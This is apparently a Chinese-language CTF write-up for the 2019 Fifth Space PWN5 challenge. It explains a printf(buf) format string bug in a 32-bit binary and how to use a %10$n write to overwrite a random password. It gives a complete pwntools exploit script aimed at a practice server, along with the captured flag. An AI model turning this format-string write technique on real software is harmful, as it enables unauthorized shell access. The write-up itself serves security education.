---
title: PWN5 格式化字符串漏洞：任意地址写
date: 2026-05-09 21:02:00
categories:
  - pwn
tags:
  - 格式化字符串
  - 任意地址写
  - 32位
  - "%n"
---

> 第五空间2019 决赛 | 利用 %n 格式化控制符篡改随机密码

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 题目名称 | [第五空间2019 决赛] PWN5 |
| 架构 | 32位 Linux ELF (i386) |
| 核心漏洞 | 格式化字符串漏洞 (Format String Bug) |
| 利用技巧 | %n 任意地址写 (Arbitrary Write) |

## 0x02 逆向分析

### 阶段一：生成并保存真随机密码

程序打开 `/dev/urandom`，读取 4 字节保存到全局变量 `0x804C044` 中。这是真随机数，暴力破解不可能。

```asm
lea     eax, (aDevUrandom - 804C000h)[ebx]  ; "/dev/urandom"
push    eax
call    _open
; ...
mov     eax, offset unk_804C044  ; 随机数存入全局变量 0x804C044
push    eax
call    _read
```

### 阶段二：致命的格式化字符串漏洞

程序要求用户输入名字，并直接打印：

```asm
lea     eax, [ebp+buf]
push    eax             ; 直接将 buf 作为格式化字符串参数压栈
call    _printf         ; 致命漏洞：printf(buf) !!!
```

正常代码应该是 `printf("%s", buf)`。由于写成了 `printf(buf)`，输入 `%x`、`%n` 等会被当作格式化指令执行。

### 阶段三：密码校验

```asm
call    _atoi           ; 用户输入转为整数
mov     edx, eax
mov     eax, offset unk_804C044
mov     eax, [eax]      ; 取出随机密码
cmp     edx, eax        ; 对比
jz      short loc_804931A ; 相等则执行 system("/bin/sh")
```

## 0x03 漏洞利用思路

既然密码是随机的，我们无法猜透，那我们就改掉它！

**利用 `%n` 控制符**：它的作用不是打印，而是将目前为止已经打印的字符个数，写入到指定的内存地址中。

**利用步骤**：

1. **确定目标**：修改地址 `0x804C044`
2. **计算偏移**：`esp` 到 `buf` 距离为 `0x28`，除以 4 字节/参数 = 第 10 个参数位置
3. **构造 Payload**：
   - 开头放目标地址：`p32(0x804C044)`，占用 4 字节
   - 使用 `%10$n`：将当前打印的字符数（4）写入第 10 个参数指向的地址
   - 随机密码被强制改成 4
4. **通关**：最后输入密码 `4` 即可通过校验

## 0x04 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

io = remote('node5.buuoj.cn', 27298)

# 目标地址：保存随机密码的变量
target_addr = 0x804C044

# 构造 Payload: [目标地址] + [%10$n]
# p32(target_addr) 占用 4 字节，%n 写入值为 4
payload = p32(target_addr) + b"%10$n"

# 发送 Payload 篡改密码
io.recvuntil(b"your name:")
io.sendline(payload)

# 发送已知的篡改后密码
io.recvuntil(b"your passwd:")
io.sendline(b"4")

# 获取 Shell
io.interactive()
```

## 0x05 执行结果

```
Payload: 44 c0 04 08  25 31 30 24  6e 0a
         ↑ p32地址    ↑ %10$n

程序回显: ok!!
Flag: flag{7e95583a-a1d1-417e-8417-bd1812219a1c}
```

## 0x06 核心考点

- **格式化字符串漏洞**：`printf(buf)` 而非 `printf("%s", buf)`
- **`%n` 任意地址写**：将打印的字符数写入指定地址
- **偏移计算**：栈上 buf 到 printf 参数的距离
- **变废为宝**：无法破解随机数时，直接篡改存储地址
